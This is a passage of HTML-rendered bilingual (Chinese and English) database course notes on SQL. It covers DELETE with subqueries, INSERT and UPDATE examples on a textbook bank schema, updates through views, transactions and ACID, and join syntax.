</span><span id="__span-75-11"><a id="__codelineno-75-11" name="__codelineno-75-11" href="#note-db-sql-__codelineno-75-11"></a><span class="w">    </span><span class="k">FROM</span><span class="w"> </span><span class="n">branch</span><span class="w"> </span><span class="n">B</span><span class="p">,</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="n">A</span><span class="w"> </span>
</span><span id="__span-75-12"><a id="__codelineno-75-12" name="__codelineno-75-12" href="#note-db-sql-__codelineno-75-12"></a><span class="w">    </span><span class="k">WHERE</span><span class="w"> </span><span class="n">branch_city</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Needham&#39;</span><span class="w"> </span>
</span><span id="__span-75-13"><a id="__codelineno-75-13" name="__codelineno-75-13" href="#note-db-sql-__codelineno-75-13"></a><span class="w">    </span><span class="k">AND</span><span class="w"> </span><span class="n">B</span><span class="p">.</span><span class="n">branch_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">A</span><span class="p">.</span><span class="n">branch_name</span>
</span><span id="__span-75-14"><a id="__codelineno-75-14" name="__codelineno-75-14" href="#note-db-sql-__codelineno-75-14"></a><span class="p">);</span>
</span></code></pre></div>
<p>以下写法错误</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#note-db-sql-__codelineno-76-1"></a><span class="k">DELETE</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">account</span><span class="p">,</span><span class="w"> </span><span class="n">depositor</span><span class="p">,</span><span class="w"> </span><span class="n">branch</span>
</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2" href="#note-db-sql-__codelineno-76-2"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">account</span><span class="p">.</span><span class="n">account_number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">depositor</span><span class="p">.</span><span class="n">account_number</span>
</span><span id="__span-76-3"><a id="__codelineno-76-3" name="__codelineno-76-3" href="#note-db-sql-__codelineno-76-3"></a><span class="k">AND</span><span class="w"> </span><span class="n">branch</span><span class="p">.</span><span class="n">branch_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">account</span><span class="p">.</span><span class="n">branch_name</span>
</span><span id="__span-76-4"><a id="__codelineno-76-4" name="__codelineno-76-4" href="#note-db-sql-__codelineno-76-4"></a><span class="k">AND</span><span class="w"> </span><span class="n">branch_city</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Needham&#39;</span><span class="p">;</span>
</span></code></pre></div>
<div style="color: red;">
每一个delete语句，只能够针对一个表进行操作，不能够针对多个表进行操作。
</div>

<p>Example2:</p>
<p>Delete the record of all accounts with balances below the average at the bank. </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#note-db-sql-__codelineno-77-1"></a><span class="k">DELETE</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">avg</span><span class="p">(</span><span class="n">balance</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">account</span><span class="p">);</span>
</span></code></pre></div>
<p><strong>Problem:</strong> as we delete tuples from account, the average 
balance changes.</p>
<p><strong>Solution:</strong></p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#note-db-sql-__codelineno-78-1"></a><span class="k">WITH</span><span class="w"> </span><span class="n">avg_balance</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2" href="#note-db-sql-__codelineno-78-2"></a><span class="w">    </span><span class="k">SELECT</span><span class="w"> </span><span class="k">avg</span><span class="p">(</span><span class="n">balance</span><span class="p">)</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">avg_bal</span>
</span><span id="__span-78-3"><a id="__codelineno-78-3" name="__codelineno-78-3" href="#note-db-sql-__codelineno-78-3"></a><span class="w">    </span><span class="k">FROM</span><span class="w"> </span><span class="n">account</span>
</span><span id="__span-78-4"><a id="__codelineno-78-4" name="__codelineno-78-4" href="#note-db-sql-__codelineno-78-4"></a><span class="p">),</span>
</span><span id="__span-78-5"><a id="__codelineno-78-5" name="__codelineno-78-5" href="#note-db-sql-__codelineno-78-5"></a><span class="n">to_delete</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-78-6"><a id="__codelineno-78-6" name="__codelineno-78-6" href="#note-db-sql-__codelineno-78-6"></a><span class="w">    </span><span class="k">SELECT</span><span class="w"> </span><span class="n">account_number</span>
</span><span id="__span-78-7"><a id="__codelineno-78-7" name="__codelineno-78-7" href="#note-db-sql-__codelineno-78-7"></a><span class="w">    </span><span class="k">FROM</span><span class="w"> </span><span class="n">account</span>
</span><span id="__span-78-8"><a id="__codelineno-78-8" name="__codelineno-78-8" href="#note-db-sql-__codelineno-78-8"></a><span class="w">    </span><span class="k">WHERE</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">avg_bal</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">avg_balance</span><span class="p">)</span>
</span><span id="__span-78-9"><a id="__codelineno-78-9" name="__codelineno-78-9" href="#note-db-sql-__codelineno-78-9"></a><span class="p">)</span>
</span><span id="__span-78-10"><a id="__codelineno-78-10" name="__codelineno-78-10" href="#note-db-sql-__codelineno-78-10"></a><span class="k">DELETE</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">account</span>
</span><span id="__span-78-11"><a id="__codelineno-78-11" name="__codelineno-78-11" href="#note-db-sql-__codelineno-78-11"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">account_number</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">account_number</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">to_delete</span><span class="p">);</span>
</span></code></pre></div>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>在同一SQL语句内，除非外层查询的元组变量引入内层查询，否则层查询只进行一次.</p>
<p>这句话的意思是：在一个 SQL 语句中，除非外层查询的元组变量（即表的别名或列名）被引入到内层查询中，否则内层查询只会执行一次。</p>
<p>换句话说，如果内层查询不依赖于外层查询的任何变量或条件，那么内层查询会在整个 SQL 语句执行过程中只运行一次，并将其结果用于外层查询的每一行。如果内层查询依赖于外层查询的变量，那么内层查询可能会为外层查询的每一行执行一次。</p>
</div>
<h3 id="note-db-sql-insertion">Insertion<a class="headerlink" href="#note-db-sql-insertion" title="Permanent link">&para;</a></h3>
<p>Add a new tuple to the relation.</p>
<p>Format:</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#note-db-sql-__codelineno-79-1"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="o">&lt;</span><span class="k">table</span><span class="o">|</span><span class="k">view</span><span class="o">&gt;</span><span class="w"> </span><span class="p">[(</span><span class="n">c1</span><span class="p">,</span><span class="w"> </span><span class="n">c2</span><span class="p">,</span><span class="err">…</span><span class="p">)]</span><span class="w"> </span>
</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2" href="#note-db-sql-__codelineno-79-2"></a><span class="w">      </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="n">e1</span><span class="p">,</span><span class="w"> </span><span class="n">e2</span><span class="p">,</span><span class="w"> </span><span class="err">…</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-79-3"><a id="__codelineno-79-3" name="__codelineno-79-3" href="#note-db-sql-__codelineno-79-3"></a><span class="c1">-- or</span>
</span><span id="__span-79-4"><a id="__codelineno-79-4" name="__codelineno-79-4" href="#note-db-sql-__codelineno-79-4"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="o">&lt;</span><span class="k">table</span><span class="o">|</span><span class="k">view</span><span class="o">&gt;</span><span class="w"> </span><span class="p">[(</span><span class="n">c1</span><span class="p">,</span><span class="w"> </span><span class="n">c2</span><span class="p">,</span><span class="err">…</span><span class="p">)]</span><span class="w"> </span>
</span><span id="__span-79-5"><a id="__codelineno-79-5" name="__codelineno-79-5" href="#note-db-sql-__codelineno-79-5"></a><span class="w">      </span><span class="k">SELECT</span><span class="w"> </span><span class="n">e1</span><span class="p">,</span><span class="w"> </span><span class="n">e2</span><span class="p">,</span><span class="w"> </span><span class="err">…</span><span class="w"> </span>
</span><span id="__span-79-6"><a id="__codelineno-79-6" name="__codelineno-79-6" href="#note-db-sql-__codelineno-79-6"></a><span class="w">      </span><span class="k">FROM</span><span class="w"> </span><span class="err">…</span><span class="w"> </span>
</span></code></pre></div>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#note-db-sql-__codelineno-80-1"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="p">(</span><span class="n">account_number</span><span class="p">,</span><span class="w"> </span><span class="n">branch_name</span><span class="p">,</span><span class="w"> </span><span class="n">balance</span><span class="p">)</span>
</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2" href="#note-db-sql-__codelineno-80-2"></a><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;A_9732&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Perryridge&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1200</span><span class="p">);</span>
</span><span id="__span-80-3"><a id="__codelineno-80-3" name="__codelineno-80-3" href="#note-db-sql-__codelineno-80-3"></a>
</span><span id="__span-80-4"><a id="__codelineno-80-4" name="__codelineno-80-4" href="#note-db-sql-__codelineno-80-4"></a><span class="c1">-- or equivalently</span>
</span><span id="__span-80-5"><a id="__codelineno-80-5" name="__codelineno-80-5" href="#note-db-sql-__codelineno-80-5"></a>
</span><span id="__span-80-6"><a id="__codelineno-80-6" name="__codelineno-80-6" href="#note-db-sql-__codelineno-80-6"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="p">(</span><span class="n">branch_name</span><span class="p">,</span><span class="w"> </span><span class="n">balance</span><span class="p">,</span><span class="w"> </span><span class="n">account_number</span><span class="p">)</span>
</span><span id="__span-80-7"><a id="__codelineno-80-7" name="__codelineno-80-7" href="#note-db-sql-__codelineno-80-7"></a><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;Perryridge&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1200</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;A_9732&#39;</span><span class="p">);</span>
</span></code></pre></div>
<p>Such as:Provide as a gift for all loan customers of the Perryridge branch, a $200 savings account.  Let the loan number serve as the account number for the new savings account. </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#note-db-sql-__codelineno-81-1"></a><span class="c1">-- Step 1: insert into account</span>
</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2" href="#note-db-sql-__codelineno-81-2"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="p">(</span><span class="n">account_number</span><span class="p">,</span><span class="w"> </span><span class="n">branch_name</span><span class="p">,</span><span class="w"> </span><span class="n">balance</span><span class="p">)</span>
</span><span id="__span-81-3"><a id="__codelineno-81-3" name="__codelineno-81-3" href="#note-db-sql-__codelineno-81-3"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">loan_number</span><span class="p">,</span><span class="w"> </span><span class="n">branch_name</span><span class="p">,</span><span class="w"> </span><span class="mi">200</span>
</span><span id="__span-81-4"><a id="__codelineno-81-4" name="__codelineno-81-4" href="#note-db-sql-__codelineno-81-4"></a><span class="k">FROM</span><span class="w"> </span><span class="n">loan</span>
</span><span id="__span-81-5"><a id="__codelineno-81-5" name="__codelineno-81-5" href="#note-db-sql-__codelineno-81-5"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">branch_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Perryridge&#39;</span><span class="p">;</span>
</span><span id="__span-81-6"><a id="__codelineno-81-6" name="__codelineno-81-6" href="#note-db-sql-__codelineno-81-6"></a>
</span><span id="__span-81-7"><a id="__codelineno-81-7" name="__codelineno-81-7" href="#note-db-sql-__codelineno-81-7"></a><span class="c1">-- Step 2: insert into depositor</span>
</span><span id="__span-81-8"><a id="__codelineno-81-8" name="__codelineno-81-8" href="#note-db-sql-__codelineno-81-8"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">depositor</span><span class="w"> </span><span class="p">(</span><span class="n">customer_name</span><span class="p">,</span><span class="w"> </span><span class="n">account_number</span><span class="p">)</span>
</span><span id="__span-81-9"><a id="__codelineno-81-9" name="__codelineno-81-9" href="#note-db-sql-__codelineno-81-9"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">customer_name</span><span class="p">,</span><span class="w"> </span><span class="n">A</span><span class="p">.</span><span class="n">loan_number</span>
</span><span id="__span-81-10"><a id="__codelineno-81-10" name="__codelineno-81-10" href="#note-db-sql-__codelineno-81-10"></a><span class="k">FROM</span><span class="w"> </span><span class="n">loan</span><span class="w"> </span><span class="n">A</span><span class="p">,</span><span class="w"> </span><span class="n">borrower</span><span class="w"> </span><span class="n">B</span>
</span><span id="__span-81-11"><a id="__codelineno-81-11" name="__codelineno-81-11" href="#note-db-sql-__codelineno-81-11"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">A</span><span class="p">.</span><span class="n">branch_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Perryridge&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">A</span><span class="p">.</span><span class="n">loan_number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">B</span><span class="p">.</span><span class="n">loan_number</span><span class="p">;</span>
</span></code></pre></div>
<div class="admonition question">
<p class="admonition-title">what? select 200?</p>
<p>在 SQL 中，<code>SELECT</code> 语句可以用于从一个或多个表中提取数据，
并且可以在 <code>SELECT</code> 子句中使用常量值。常量值会被应用到每一行的结果中。</p>
<p>代码中：</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#note-db-sql-__codelineno-82-1"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="p">(</span><span class="n">account_number</span><span class="p">,</span><span class="w"> </span><span class="n">branch_name</span><span class="p">,</span><span class="w"> </span><span class="n">balance</span><span class="p">)</span>
</span><span id="__span-82-2"><a id="__codelineno-82-2" name="__codelineno-82-2" href="#note-db-sql-__codelineno-82-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">loan_number</span><span class="p">,</span><span class="w"> </span><span class="n">branch_name</span><span class="p">,</span><span class="w"> </span><span class="mi">200</span>
</span><span id="__span-82-3"><a id="__codelineno-82-3" name="__codelineno-82-3" href="#note-db-sql-__codelineno-82-3"></a><span class="k">FROM</span><span class="w"> </span><span class="n">loan</span>
</span><span id="__span-82-4"><a id="__codelineno-82-4" name="__codelineno-82-4" href="#note-db-sql-__codelineno-82-4"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">branch_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Perryridge&#39;</span><span class="p">;</span>
</span></code></pre></div>
<p>这里的 <code>SELECT loan_number, branch_name, 200</code> 是从 <code>loan</code> 表中选择 <code>loan_number</code> 和 <code>branch_name</code>，并且为每一行都插入一个常量值 <code>200</code> 作为 <code>balance</code>。
这意味着对于每一个符合条件的 <code>loan</code> 表中的记录，都会插入一条新的记录到 <code>account</code> 表中，其中 <code>balance</code> 字段的值固定为 <code>200</code>。
这种用法在 SQL 中是合法的，并且常用于在插入数据时为某些字段设置默认值或固定值。</p>
</div>
<p>The "select from where" statement is fully evaluated before any of its results are inserted into the relation. </p>
<h3 id="note-db-sql-updates">Updates<a class="headerlink" href="#note-db-sql-updates" title="Permanent link">&para;</a></h3>
<p>Update the value of an attribute of a tuple.</p>
<p>Format:</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#note-db-sql-__codelineno-83-1"></a><span class="k">UPDATE</span><span class="w"> </span><span class="o">&lt;</span><span class="k">table</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">view</span><span class="o">&gt;</span><span class="w"> </span>
</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2" href="#note-db-sql-__codelineno-83-2"></a><span class="w">          </span><span class="k">SET</span><span class="w"> </span><span class="o">&lt;</span><span class="n">c1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">e1</span><span class="w"> </span><span class="p">[,</span><span class="w"> </span><span class="n">c2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">e2</span><span class="p">,</span><span class="w"> </span><span class="err">…</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> </span><span class="p">[</span><span class="k">WHERE</span><span class="w"> </span><span class="o">&lt;</span><span class="n">condition</span><span class="o">&gt;</span><span class="p">]</span><span class="w"> </span>
</span></code></pre></div>
<p>Such as:</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#note-db-sql-__codelineno-84-1"></a><span class="k">UPDATE</span><span class="w"> </span><span class="n">account</span><span class="w"> </span>
</span><span id="__span-84-2"><a id="__codelineno-84-2" name="__codelineno-84-2" href="#note-db-sql-__codelineno-84-2"></a><span class="k">SET</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">1</span><span class="p">.</span><span class="mi">05</span><span class="w"> </span>
</span><span id="__span-84-3"><a id="__codelineno-84-3" name="__codelineno-84-3" href="#note-db-sql-__codelineno-84-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">branch_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Perryridge&#39;</span><span class="p">;</span>
</span></code></pre></div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>Increase all accounts with balances over $10,000 by 6%, all other accounts receive 5%. </p>
<p><div class="language-sql highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#note-db-sql-__codelineno-85-1"></a><span class="k">UPDATE</span><span class="w"> </span><span class="n">account</span><span class="w"> </span>
</span><span id="__span-85-2"><a id="__codelineno-85-2" name="__codelineno-85-2" href="#note-db-sql-__codelineno-85-2"></a><span class="k">SET</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">1</span><span class="p">.</span><span class="mi">06</span><span class="w"> </span>
</span><span id="__span-85-3"><a id="__codelineno-85-3" name="__codelineno-85-3" href="#note-db-sql-__codelineno-85-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">10000</span><span class="p">;</span>
</span><span id="__span-85-4"><a id="__codelineno-85-4" name="__codelineno-85-4" href="#note-db-sql-__codelineno-85-4"></a>
</span><span id="__span-85-5"><a id="__codelineno-85-5" name="__codelineno-85-5" href="#note-db-sql-__codelineno-85-5"></a><span class="k">UPDATE</span><span class="w"> </span><span class="n">account</span><span class="w"> </span>
</span><span id="__span-85-6"><a id="__codelineno-85-6" name="__codelineno-85-6" href="#note-db-sql-__codelineno-85-6"></a><span class="k">SET</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">1</span><span class="p">.</span><span class="mi">05</span><span class="w"> </span>
</span><span id="__span-85-7"><a id="__codelineno-85-7" name="__codelineno-85-7" href="#note-db-sql-__codelineno-85-7"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">10000</span><span class="p">;</span>
</span></code></pre></div>
The order is important.
如果顺序反过来，那么有可能一开始没有10000，先更新了，然后就变成10000了，然后又可以增加6%了。</p>
</div>
<h4 id="note-db-sql-case-statement-for-conditional-updates">Case Statement for Conditional Updates<a class="headerlink" href="#note-db-sql-case-statement-for-conditional-updates" title="Permanent link">&para;</a></h4>
<p>The same query as before: Increase all accounts with balances over $10,000 by 6%, and all other accounts receive 5%. </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#note-db-sql-__codelineno-86-1"></a><span class="k">UPDATE</span><span class="w"> </span><span class="n">account</span>
</span><span id="__span-86-2"><a id="__codelineno-86-2" name="__codelineno-86-2" href="#note-db-sql-__codelineno-86-2"></a><span class="k">SET</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">CASE</span>
</span><span id="__span-86-3"><a id="__codelineno-86-3" name="__codelineno-86-3" href="#note-db-sql-__codelineno-86-3"></a><span class="w">    </span><span class="k">WHEN</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">10000</span><span class="w"> </span><span class="k">THEN</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">1</span><span class="p">.</span><span class="mi">05</span>
</span><span id="__span-86-4"><a id="__codelineno-86-4" name="__codelineno-86-4" href="#note-db-sql-__codelineno-86-4"></a><span class="w">    </span><span class="k">ELSE</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">1</span><span class="p">.</span><span class="mi">06</span>
</span><span id="__span-86-5"><a id="__codelineno-86-5" name="__codelineno-86-5" href="#note-db-sql-__codelineno-86-5"></a><span class="k">END</span><span class="p">;</span>
</span></code></pre></div>
<h4 id="note-db-sql-update-of-view">Update of view<a class="headerlink" href="#note-db-sql-update-of-view" title="Permanent link">&para;</a></h4>
<p>Example:Create a view of all loan data in loan relation, hiding the amount attribute. </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#note-db-sql-__codelineno-87-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">VIEW</span><span class="w"> </span><span class="n">branch_loan</span><span class="w"> </span><span class="k">as</span><span class="w"> </span>
</span><span id="__span-87-2"><a id="__codelineno-87-2" name="__codelineno-87-2" href="#note-db-sql-__codelineno-87-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">branch_name</span><span class="p">,</span><span class="w"> </span><span class="n">loan_number</span><span class="w"> </span>
</span><span id="__span-87-3"><a id="__codelineno-87-3" name="__codelineno-87-3" href="#note-db-sql-__codelineno-87-3"></a><span class="k">FROM</span><span class="w"> </span><span class="n">loan</span><span class="p">;</span>
</span></code></pre></div>
<p>Add a new tuple to branch_loan. </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#note-db-sql-__codelineno-88-1"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">branch_loan</span><span class="w"> </span>
</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2" href="#note-db-sql-__codelineno-88-2"></a><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;Perryridge&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;L-307&#39;</span><span class="p">)</span><span class="w"> </span>
</span></code></pre></div>
<p>This insertion will be translated into: </p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#note-db-sql-__codelineno-89-1"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">loan</span><span class="w"> </span>
</span><span id="__span-89-2"><a id="__codelineno-89-2" name="__codelineno-89-2" href="#note-db-sql-__codelineno-89-2"></a><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;L-307&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Perryridge&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">null</span><span class="p">)</span><span class="w"> </span>
</span></code></pre></div>
<p>Updates on more complex views are difficult or impossible to translate into updates on the base relations,and hence are not allowed.</p>
<h4 id="note-db-sql-summary-of-update-on-view">Summary of update on view<a class="headerlink" href="#note-db-sql-summary-of-update-on-view" title="Permanent link">&para;</a></h4>
<ul>
<li>View 是虚表，对其进行的所有操作都将转化为对基表的操作。</li>
<li>查询操作时，VIEW与基表没有区别，但对VIEW的更新操作有严格限制，如只有行列视图(建立在单个基本表上的视图，且视图的列对应表的列，称为"行列视图"。)，可更新数据</li>
<li>大多数SQL实现只允许在单个关系上定义的简单视图上进行更新操作，且不包含聚合函数</li>
</ul>
<h3 id="note-db-sql-transaction">Transaction<a class="headerlink" href="#note-db-sql-transaction" title="Permanent link">&para;</a></h3>
<p>在 SQL 中，事务（Transaction）是指一系列查询和数据更新语句，这些语句作为一个单一的逻辑单元执行。事务的目的是确保数据库操作的完整性和一致性。事务通常具有以下四个特性，简称为 ACID：</p>
<ol>
<li>
<p><strong>原子性（Atomicity）</strong>：事务中的所有操作要么全部完成，要么全部不完成。事务不能只完成其中的一部分。</p>
</li>
<li>
<p><strong>一致性（Consistency）</strong>：事务的执行必须使数据库从一个一致的状态转变为另一个一致的状态。</p>
</li>
<li>
<p><strong>隔离性（Isolation）</strong>：一个事务的执行不能被其他事务干扰。即使多个事务并发执行，在事务之间的操作结果是相互隔离的。</p>
</li>
<li>
<p><strong>持久性（Durability）</strong>：一旦事务提交，其结果就应该永久保存在数据库中，即使系统发生故障。</p>
</li>
</ol>
<p>在 SQL 中，事务通常是隐式启动的，并通过以下两种方式之一来终止：</p>
<ul>
<li>
<p><strong>COMMIT WORK</strong>：提交事务，将事务中所有的更新永久地保存到数据库中。这意味着事务中的所有操作都被确认并生效。</p>
</li>
<li>
<p><strong>ROLLBACK WORK</strong>：回滚事务，撤销事务中执行的所有更新。这意味着事务中的所有操作都被取消，数据库状态恢复到事务开始之前的状态。</p>
</li>
</ul>
<p>通过使用 <code>COMMIT</code> 和 <code>ROLLBACK</code>，可以控制事务的完成或取消，从而确保数据库的可靠性和一致性，即使在出现错误或系统崩溃的情况下。</p>
<h2 id="note-db-sql-joined-relations">Joined Relations<a class="headerlink" href="#note-db-sql-joined-relations" title="Permanent link">&para;</a></h2>
<p>Join operations take as input two relations and return as a result another relation. </p>
<p><span style="color:red">Join condition</span> – defines which tuples in the two relations match, and what attributes are present in the result of the join. </p>
<p><span style="color:red">Join type</span> – defines how tuples in each relation that do not match any tuple in the other relation (based on the join condition) are treated. </p>
<ul>
<li>自然连接：自然连接是一种特殊的等值连接，它要求两个关系中所有同名属性都相等，不需要指定连接条件。</li>
</ul>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#note-db-sql-__codelineno-90-1"></a><span class="n">R</span><span class="w"> </span><span class="k">natural</span><span class="w"> </span><span class="err">{</span><span class="k">inner</span><span class="w"> </span><span class="k">join</span><span class="p">,</span><span class="w"> </span><span class="k">left</span><span class="w"> </span><span class="k">join</span><span class="p">,</span><span class="w"> </span><span class="k">right</span><span class="w"> </span><span class="k">join</span><span class="p">,</span><span class="w"> </span><span class="k">full</span><span class="w"> </span><span class="k">join</span><span class="err">}</span><span class="w"> </span><span class="n">S</span><span class="w"> </span>
</span></code></pre></div>
<ul>
<li>非自然连接： 需要指定连接条件。</li>
</ul>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#note-db-sql-__codelineno-91-1"></a><span class="n">R</span><span class="w"> </span><span class="err">{</span><span class="k">inner</span><span class="w"> </span><span class="k">join</span><span class="p">,</span><span class="w"> </span><span class="k">left</span><span class="w"> </span><span class="k">join</span><span class="p">,</span><span class="w"> </span><span class="k">right</span><span class="w"> </span><span class="k">join</span><span class="p">,</span><span class="w"> </span><span class="k">full</span><span class="w"> </span><span class="k">join</span><span class="err">}</span><span class="w"> </span><span class="n">S</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">condition</span><span class="w"> </span><span class="k">using</span><span class="w"> </span><span class="p">(</span><span class="n">A1</span><span class="p">,</span><span class="w"> </span><span class="n">A2</span><span class="p">,</span><span class="w"> </span><span class="p">...,</span><span class="w"> </span><span class="n">An</span><span class="p">)</span>
</span></code></pre></div>
